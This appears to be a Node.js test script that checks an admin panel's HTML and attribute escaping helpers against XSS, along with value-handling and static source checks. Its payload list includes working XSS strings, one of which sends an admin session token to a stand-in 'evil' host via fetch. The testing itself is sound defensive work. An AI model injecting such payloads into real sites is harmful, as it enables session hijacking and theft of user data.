import fs from 'node:fs';

const SRC = fs.readFileSync(new URL('../js/app.js', import.meta.url), 'utf8');

// Faithful shim: a browser's textContent -> innerHTML escapes & < > but NOT quotes.
globalThis.document = {
  createElement: () => ({
    _t: '',
    set textContent(v){ this._t = String(v); },
    get textContent(){ return this._t; },
    get innerHTML(){ return this._t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); },
  }),
};

// Pull the three helpers out of the real source rather than re-implementing them.
const grab = (name) => {
  const i = SRC.indexOf(`function ${name}(`);
  let depth = 0, started = false, j = i;
  for (; j < SRC.length; j++) {
    if (SRC[j] === '{') { depth++; started = true; }
    else if (SRC[j] === '}') { depth--; if (started && depth === 0) { j++; break; } }
  }
  return SRC.slice(i, j);
};
const { escapeHtml, escapeAttr, formatDate } = await import(
  'data:text/javascript,' + encodeURIComponent(
    `${grab('escapeHtml')}\n${grab('escapeAttr')}\n${grab('formatDate')}\nexport {escapeHtml, escapeAttr, formatDate};`
  )
);

let pass=0, fail=0;
const ck=(n,c,d='')=>{ c?(pass++,console.log('  PASS  '+n)):(fail++,console.log('  FAIL  '+n+(d?' — '+d:''))); };

console.log('\nSEC-02  Admin-panel XSS payloads are neutralised');
console.log('───────────────────────────────────────────────');

const payloads = [
  `<img src=x onerror="fetch('https://evil/'+localStorage.bcci_admin_session)">`,
  `<script>alert(document.cookie)</script>`,
  `"><svg/onload=alert(1)>`,
  `<iframe src="javascript:alert(1)">`,
  `</td><td><script>x()</script>`,
];
for (const p of payloads) {
  const out = escapeHtml(p);
  ck(`neutralised: ${p.slice(0,40)}…`, !out.includes('<') && !out.includes('>'), out.slice(0,60));
}

console.log('\nAttribute-context escaping');
console.log('──────────────────────────');
ck('escapeAttr closes the double-quote break-out', !escapeAttr('" onerror="alert(1)').includes('"'), escapeAttr('" onerror="alert(1)'));
ck('escapeAttr closes the single-quote break-out', !escapeAttr("' onerror='alert(1)").includes("'"));
ck('plain values survive intact', escapeHtml('Alpha Chem Pvt Ltd') === 'Alpha Chem Pvt Ltd');
ck('ampersands encoded once, not twice', escapeHtml('Shah & Sons') === 'Shah &amp; Sons', escapeHtml('Shah & Sons'));

console.log('\nDefensive value handling');
console.log('────────────────────────');
ck('null renders empty', escapeHtml(null) === '');
ck('undefined renders empty', escapeHtml(undefined) === '');
ck('zero renders "0", not empty (old bug)', escapeHtml(0) === '0', `got "${escapeHtml(0)}"`);
ck('false renders "false"', escapeHtml(false) === 'false');
ck('bad date renders a dash, not "Invalid Date"', formatDate('nonsense') === '—', formatDate('nonsense'));
ck('missing date renders a dash', formatDate(undefined) === '—');
ck('real date formats', /\d/.test(formatDate('2026-08-02T10:00:00Z')));

console.log('\nStatic sweep of the admin render paths');
console.log('──────────────────────────────────────');
const adminBlock = SRC.slice(SRC.indexOf('async renderAdminPortal()'), SRC.indexOf('async handleApproveApplication'));
const rawRecordRefs = [...adminBlock.matchAll(/\$\{\s*(app|enq)\.[A-Za-z]+/g)].map(m=>m[0]);
ck('no raw ${app.*} / ${enq.*} left in the admin tables', rawRecordRefs.length === 0, rawRecordRefs.join(', '));

const inspectBlock = SRC.slice(SRC.indexOf("data-inspect-id]"), SRC.indexOf('_paymentProofHtml(proof)'));
const rawInspect = [...inspectBlock.matchAll(/\$\{\s*app\.[A-Za-z]+/g)].map(m=>m[0]).filter(s=>!s.includes('status'));
ck('no raw ${app.*} left in the inspect modal', rawInspect.length === 0, rawInspect.join(', '));

ck('client no longer calls the email endpoint directly', !SRC.includes('store.sendEmail('));
ck('admin recipient no longer hardcoded client-side', !SRC.includes('CONFIG.ADMIN_EMAIL'));
ck('toast output is escaped', /toast\.innerHTML[\s\S]{0,120}escapeHtml\(message\)/.test(SRC));
ck('FAQ answer id bug fixed', SRC.includes('id="${faqId}"') && !SRC.includes('id="faqId"'));

console.log(`\n${'═'.repeat(52)}\n  ${pass} passed, ${fail} failed\n${'═'.repeat(52)}`);
process.exit(fail?1:0);
